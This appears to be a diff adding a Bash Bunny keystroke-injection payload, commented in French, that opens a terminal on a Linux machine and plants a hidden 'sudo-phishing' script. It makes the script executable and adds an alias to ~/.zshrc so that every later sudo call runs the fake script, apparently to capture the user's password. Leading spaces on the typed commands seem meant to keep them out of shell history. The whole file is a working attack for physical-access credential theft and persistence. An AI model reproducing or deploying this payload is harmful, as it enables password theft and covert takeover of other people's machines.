@@ -1,0 +1,63 @@
+#!/bin/bash
+
+# Création d'un faux sudo à l'aide un alias persistent
+
+
+######## Initialisation ########
+
+readonly BB_LABEL="BashBunny"
+
+######## SETUP ########
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+udisk mount
+
+######## ATTACK ########
+
+LED ATTACK
+
+Q DELAY 500
+Q CTRL-ALT t
+Q DELAY 500
+
+LED STAGE2
+
+Q STRING " cd /media/\${USER}/${BB_LABEL}/payloads/${SWITCH_POSITION}/"
+Q ENTER
+Q DELAY 100
+
+Q STRING " cp ./sudo-phishing.sh ~/.sudo_phishing.sh"
+Q ENTER
+Q DELAY 100
+
+LED STAGE3
+
+Q STRING " chmod +x ~/.sudo_phishing.sh"
+Q ENTER
+Q DELAY 100
+
+Q STRING " echo alias sudo='~/./.sudo_phishing.sh'  >> ~/.zshrc && source ~/.zshrc"
+Q ENTER
+Q DELAY 100
+
+LED STAGE4
+
+Q STRING " exit"
+Q ENTER
+Q DELAY 100
+
+######## CLEANUP ########
+
+LED CLEANUP
+
+sync
+udisk unmount
+
+######## FINISH ########
+
+LED FINISH
+
+shutdown -h 0
